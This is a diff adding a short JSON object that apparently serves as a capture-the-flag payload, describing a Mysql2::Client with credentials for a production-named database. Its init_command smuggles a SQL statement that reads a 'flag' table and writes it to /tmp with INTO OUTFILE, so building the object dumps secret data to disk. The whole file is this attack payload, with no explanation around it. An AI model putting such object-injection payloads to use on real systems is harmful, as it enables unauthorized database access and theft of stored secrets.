@@ -1,0 +1,10 @@
+{
+  "type": "Mysql2::Client",
+  "arg": {
+    "host": "127.0.0.1",
+    "username": "oraclehelper",
+    "password": "7fd1d1c1f66f4d53f08b7c3c4f7a5f0d",
+    "database": "off_dah_rails_m8_production",
+    "init_command": "SELECT flag FROM flag INTO OUTFILE '/tmp/oracle_flag.txt' FIELDS TERMINATED BY '' ESCAPED BY '' LINES TERMINATED BY ''"
+  }
+}
